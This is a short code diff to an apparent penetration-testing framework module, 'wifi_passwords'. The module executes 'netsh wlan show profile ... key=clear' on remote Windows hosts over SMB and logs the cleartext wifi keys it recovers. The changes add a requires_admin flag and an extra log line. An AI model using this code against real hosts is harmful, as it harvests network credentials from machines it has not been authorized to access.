@@ -3,10 +3,11 @@ from ar3.core.smbexec import SMBEXEC
 
 class WifiPasswords():
     def __init__(self):
-        self.name = 'wifi_passwords'
-        self.description = 'Extract wifi passwords from system'
-        self.author = ['@m8r0wn']
-        self.args = {}
+        self.name           = 'wifi_passwords'
+        self.description    = 'Extract wifi passwords from system'
+        self.author         = ['@m8r0wn']
+        self.requires_admin = True
+        self.args           = {}
 
     def run(self, target, args, smb_con, loggers, config_obj):
         profiles = []
@@ -39,6 +40,7 @@ class WifiPasswords():
                     for result in executioner.execute('netsh wlan show profile name=\"{}\" key=clear'.format(p)).splitlines():
                         if result.split(":")[0].strip() in ['SSID name', 'Authentication', 'Cipher', 'Key Content']:
                             logger.success([smb_con.host, smb_con.ip, self.name.upper(), result.lstrip()])
+                            loggers[args.mode].info('Wifi_Passwords\t{}\t{}\t{}'.format(smb_con.host, smb_con.ip, result.lstrip()))
                 except Exception as e:
                     logger.debug([smb_con.host, smb_con.ip, self.name.upper(), "{}: {}".format(self.name, str(e))])
 
